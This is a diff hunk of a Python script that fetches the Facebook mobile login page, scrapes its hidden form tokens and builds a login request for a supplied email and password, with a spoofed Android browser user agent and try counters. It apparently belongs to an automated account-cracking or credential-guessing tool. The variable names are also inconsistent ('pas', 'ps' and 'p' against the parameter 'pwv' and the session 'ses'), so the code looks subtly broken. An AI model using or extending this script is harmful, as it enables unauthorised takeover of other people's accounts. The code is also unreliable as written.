@@ -977,8 +977,8 @@ def m2(idf,pwv):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'})
-   link = ses.get('https://m.facebook.com/') 
-   dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":ps,"login":"Log In"}
+   free_fb = ses.get('https://m.facebook.com/') 
+   dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pas,"login":"Log In"}
    koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
    koki+=' m_pixel_ratio=2.625; wd=412x756'
    heade={'authority':'m.facebook.com',
